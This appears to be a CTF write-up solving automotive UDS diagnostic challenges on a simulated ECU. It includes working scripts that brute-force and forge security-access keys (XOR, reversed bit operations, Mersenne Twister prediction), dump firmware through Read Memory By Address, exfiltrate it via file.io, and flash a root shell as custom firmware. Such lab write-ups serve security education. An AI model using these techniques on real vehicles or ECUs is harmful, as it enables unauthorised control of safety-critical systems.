# User Space Diagnostics

The [scripts](scripts) directory contains the scripts I used to solve all the challenges in the User
Space Diagnostics CTF category. Most of these challenges were simple enough to where you can
understand the solutions simply by reading the source code of these scripts.

Below, however, are writeups for _Security Access Level 1/3/5_ and _Custom Firmware_.

## Security Access Level 1 Writeup

The challenge description reads:

> I hear single byte XOR keys are a great security measure, can you prove me wrong?

From this, we can guess that the key is essentially the seed with each byte xor-ed with a fixed
8-bit value. Therefore, we just need to write a script to try each value, and within 256
authentication attempts, we should find one that produces a valid key.

```py
#!/usr/bin/python3

from common import *

def broadcast(x, n):
    '''Broadcast byte `x` to all bytes in an `n`-byte integer.'''
    k = 8
    while n > 1:
        x  |= (x << k)
        n >>= 1
        k <<= 1
    return x

s = socket()

for x in range(256):
    seed = getseed(s, 1)
    if not seed:
        print('Already authenticated to security access level 1')
        sys.exit(0)
    data = sendkey(s, 1, p32(u32(seed) ^ broadcast(x, 4)))
    if data:
        print(data.decode())
        break
```

Upon successfully authenticating to security access level 1, we are sent the flag for this
challenge.

**Flag:** `bh{whats_wrong_with_static_keys?}`

## Security Access Level 3 Writeup

For security access level 3, we have to dump the firmware from the ECU and reverse engineer it to
figure out how to generate valid keys.

The challenge description gives us a hint where to look:

> You will need to dump the firmware of the application to do this, and further challenges.\
> As a hint, think of where linux applications get mapped without ASLR?

Without ASLR, Linux applications are mapped at address `0x400000` in virtual memory. Therefore we
can send a UDS message with service identifier (SID) 0x23 (Read Memory By Address) to request the
memory starting at that address. In my scripts, I wrote a function to easily dump up to a certain
number of bytes from any address. Having already solved this challenge, I can tell you that the
firmware image is 1 MiB in size, but, without knowing that, you can just enter a really large number
for the size, and it will stop once it reaches inaccessible memory.

```py
def readmem(s, addr, size, f=None):
    dump = b''
    step = READ_MEMORY_MAX_SIZE
    while step > 0:
        step = min(step, size)
        reply = sendrecv(s, bytes([ 0x23, 0x44 ]) + p32(addr) + p32(step))
        # 0x22 = Conditions Not Correct (e.g. need to authenticate)
        # 0x31 = Request Out Of Range   (e.g. invalid memory)
        if reply and reply == b'\x7f\x23\x22':
            break
        if reply and reply != b'\x7f\x23\x31':
            if f:
                f.write(reply)
            else:
                dump += reply
            addr  += step
            size  -= step
        else:
            step //= 2
    return dump
```

To dump the firmware to a file use the [getmem.py](scripts/getmem.py) script. You will need to
install the [can-isotp](https://pypi.org/project/can-isotp/) Python module, which you can do with
the command: `pip install --user can-isotp`. This will take a few minutes to complete, so be
patient.

```
$ python3 getmem.py 0x400000 1048576 image.bin
```

Next, we need to somehow get the firmware dump from Block Harbor's vehicle simulation server to our
local machine so that we can analyze it more easily. For this, I wrote a couple scripts to
[upload](scripts/upload.py) and [download](scripts/download.py) files to/from
[file.io](https://file.io/). To use them, install the Python
[requests](https://pypi.org/project/requests/) module in the same way you installed can-isotp, then
upload the firmware dump from Block Harbor's server, and download it to your local machine.

```
# On Block Habor's vehicle simulation server.
$ python3 upload.py image.bin
key = vLvD4TGDuyzB
```

```
# On your local machine.
$ python3 download.py vLvD4TGDuyzB image.bin
```

Now, with the firmware dump on our machine, we can analyze it using Ghidra. To prevent this writeup
from getting too long I'll skip over the details on how I reverse engineered the binary, but, if
you're interested in that part, you can read about it [here](Reversing.md). From this point on, I'll
just assume that we have already reversed the firmware image. To use my pre-analyzed file, create a
new project in Ghidra, go to `File -> Import File...`, and select [image.bin.gzf](image.bin.gzf).

![Security Access Level 3 Key Check](security-access-lvl-3-key-check.png)

Looking at the switch-statement in the `UDSHandler` function, we can see switch-case 6 seems to
implement the key verification for all security access levels. In particular, lines 143-159 in my
reversed image perform the key check for access level 3. We can see that the key is computed from a
sequence of bitwise operations on the seed. All we have to do now is copy/paste this code into a
script, request a seed from security access level 3, and compute the key.

```py
#!/usr/bin/python3

from common import *

s = socket()

seed = getseed(s, 3)
if not seed:
    print('Already authenticated to security access level 3')
    sys.exit(0)

# The key is computed from the following set of bit manipulations.
# See lines 145-149 of the `UDSHandler` function in image.bin.gzf.
key = [ 0 ] * 4
key[1] = ((seed[1] + (seed[2] ^ seed[1]) ^ 0xed) - (seed[2] << 4)) & 0xff
key[0] = ((seed[0] + (seed[3] ^ seed[0]) ^ 0xfe) - (seed[3] << 4)) & 0xff
key[2] = ((seed[2] + (seed[1] ^ seed[3]) ^ 0xfa) - (seed[1] << 4)) & 0xff
key[3] = ((seed[3] + (seed[0] ^ seed[2]) ^ 0xce) - (seed[0] << 4)) & 0xff
data = sendkey(s, 3, bytes(key))

print(data.decode())
```

As in the previous challenge, the flag is sent upon successful authentication.

**Flag:** `bh{bit_twiddling_is_secure}`

## Security Access Level 5 Writeup

For security access level 5, we're given the hint that a pseudo-random number generator (PRNG) is
being used in some way in this challenge, but that we might be able to predict its output. Once
again, we need to do some reversing to figure out how the keys are being generated, which I've
already covered [here](Reversing.md), so I'll skip over that tedium and go straight into the good
stuff.

![Security Access Level 5 Key Check](security-access-lvl-5-key-check.png)

As we saw in security access level 3, switch-case 6 in the `UDSHandler` function implements the key
check logic for all security levels. Likewise, switch-case 5 implements the seed generation logic.
On lines 85-92 in the screenshot, above, can see that the seed generated for access levels 1 and 3
is simply the current time in seconds. For level 5, however, the seed is generated using the
[Mersenne Twister](https://en.wikipedia.org/wiki/Mersenne_Twister) PRNG (see lines 77-84).
Furthermore, on lines 107-124 we observe that the corresponding key is generated using the same
PRNG. Therefore, to generate a valid key for this level we need to be able to somehow predict the
next value that the PRNG will return.

The Wikipedia article for Mersenne Twister gives us this key information:

> [Mersenne Twister] is not cryptographically secure, unless the CryptMT variant is used. The reason
> is that observing a sufficient number of iterations (624 in the case of MT19937, since this is the
> size of the state vector from which future iterations are produced) allows one to predict all
> future iterations.

In our case, the firmware is using the MT19937 variant of Mersenne Twister, and is, therefore, not
cryptographically secure. Rather than reinvent the wheel, we can check if there's already some
open-source software that is able to predict the output of MT19937, and, sure enough, someone
already wrote a Python [package](https://github.com/kmyk/mersenne-twister-predictor) to do just
that. Install the package using `pip`, passing in the `--user` flag if you're in Block Harbor's
vehicle simulator, and then we'll write a short script to retrieve 624 seeds from the ECU so that we
can predict the next value that will be output by the PRNG.

```py
#!/usr/bin/python3

from mt19937predictor import MT19937Predictor
from common import *

N = 32

s = socket()

# Seed the PRNG. Either 1 or 3 will work ...
getseed(s, 3)

# Feed the predictor the first 624 outputs of the PRNG.
predictor = MT19937Predictor()
for _ in range(624):
    seed = getseed(s, 5)
    if not seed:
        print('Already authenticated to security access level 5')
        sys.exit(0)
    predictor.setrandbits(u32(seed), N)

# Get the next output, which should be used as the key.
key = predictor.getrandbits(N)
data = sendkey(s, 5, p32(key))

print(data.decode())
```

Running this script, we successfully authenticate to security access level 5 and retrieve the flag.

**Flag:** `bh{i_really_hate_twister}`

## Custom Firmware

The final challenge in this CTF category requires us to flash our own firmware to the ECU. To
transfer data to the ECU, we first send a UDS message with SID 0x34 (Request Download). In this
request we specify the format of the data we are going to send (e.g. encryption vs. no encryption /
compression vs. no compression) and the size of the data. One caveat is that the `UDSHandler`
function expects the last 16 bytes of the data to contain the MD5 checksum of the rest of the data,
so we need to account for that when sending the new firmware image.

Upon initiating a software download to the ECU, we should receive a positive response containing the
maximum number of bytes that can be sent in each follow-up Transfer Data message (SID 0x36). The
size we get back is 4095, which is the maximum frame size supported by the ISO-TP protocol.
Therefore, we can send up to 4095 bytes of the firmware image at a time; however, I've found that
the checksum will sometimes fail if the max value is used (probably due to a bug in my code
somewhere). Finally, each Transfer Data message we send must contain an 8-bit sequence number, which
starts at 1 and rolls back over to 0 after sequence number 255.

```py
#!/usr/bin/python3

from common import *
import hashlib

if len(sys.argv) != 2:
    print('Usage: python flash.py <exe>')
    print('')
    print('  Flash the firmware image saved in <exe> to the ECU.')
    print('')
    print('E.g.   python flash.py shell')
    sys.exit(0)

data  = open(sys.argv[1], 'rb').read()
data += hashlib.md5(data).digest()
size  = len(data)

s = socket()

#
# Initiate a firmware download.
#
# 0x34 = SID (Request Download)
# 0x00 = Data Format ID (no encryption / no compression)
# 0x41 = Address & Length ID (1-byte address / 4-byte size)
# 0x00 = Junk address since it's not used anyways
#
reply = sendrecv(s, bytes([ 0x34, 0x00, 0x41, 0x00 ]) + p32(size))
assert_not_nrc(reply)

# Transfer the firmware block-by-block.
seqn = 1
block_size = READ_MEMORY_MAX_SIZE
while size > 0:
    reply = sendrecv(s, bytes([ 0x36, seqn ]) + data[:block_size])
    assert_not_nrc(reply)
    seqn = (seqn + 1) & 0xff
    data = data[block_size:]
    size = size - block_size

# Routine a5a5 flashes the new firmware and executes it.
rtctl(s, 0xa5a5, RT_CTL_START, no_return=True)

print('Ready!')
```

When all the data (including the checksum) has been sent to the ECU, the final step is to send a
Routine Control (SID 0x31) "start" message for routine `a5a5`, which flashes the new firmware and
executes it. This routine calls the `FlashFirmware` function (in my RE-ed firmware image), where we
can see that the controller just writes the new firmware to `/tmp/firmware`, makes it executable,
and runs it.

![Decompilation of Firmware Flashing Routine](flash-firmware.png)

Now, the final step is to make the "firmware" to flash to the ECU. When I originally did this
challenge, I didn't realize that the controller is running in the same container as us, so I thought
that the `vcan0` interface was our only means of communication with whatever firmware we flash to
the ECU. Therefore, I wrote a shell that binds to this interface and communicates over ISO-TP.
Because our firmware will actually be running on the same host (with root privileges), an easier
solution is to just run a shell bound to a local TCP port (see [backdoor.sh](scripts/backdoor.sh)).
Below, however, I will show my original solution, since it works in a wider range of scenarios.

The source code for the firmware we will flash to the ECU can be found in [shell.c](shell.c). Harbor
Bay's vehicle simulation server does not have a C/C++ compiler installed, so we will have to compile
the firmware locally and transfer the binary over to the simulator. The [Makefile](Makefile)
contains two Make targets &ndash; `shell` and `small`. The `shell` target creates a static
executable that contains our firmware image. If you have [UPX](https://upx.github.io/) installed,
you can run the `small` target to pack the firmware into a smaller binary that won't take as long to
transfer to the ECU.

```
$ make shell
$ make small
```

Transfer the shell to the simulator (see my [upload](scripts/upload.py) and
[download](scripts/download.py) scripts), authenticate to security access levels 1, 3, and 5, and
flash the firmware. When it finishes, you should see _"Ready!"_ printed to the console. I recommend
opening a second Tmux pane and running `candump vcan0`, so you can see that the script is actually
running and hasn't just hung, and so you can diagnose any errors that may occur. If you do encounter
errors, try running [reset.py](scripts/reset.py), and then attempt to flash the firmware once again.

```
$ python3 unlock.py && python3 flash.py shell
```

If everything went well, our new firmware should be running with root privileges and we will have
access to a shell over the `vcan0` interface. We can connect to it using a simple REPL that I wrote
and which can be found in [tprepl.py](scripts/tprepl.py). The flag for this challenge can be found
in `/root/flags/root.flag`.

```
$ python3 tprepl.py
> whoami
root

> ls -lR /root
/root:
total 1060
drwxr-xr-x    1 root     root            23 Jun 27 19:20 flags
-rwxr-xr-x    1 root     root           141 Mar 31  2023 run.sh
-rwxrwxr-x    1 root     root       1078520 Jun 27 19:20 server

/root/flags:
total 12
-rw-r--r--    1 root     root            17 Mar 31  2023 rmba.flag
-rw-r--r--    1 root     root            46 Mar 31  2023 root.flag
-rw-r--r--    1 root     root            26 Mar 31  2023 security-level-five.flag

>
```

**Flag:** `bh{its_as_easy_as_flashing_your_own_firmware}`
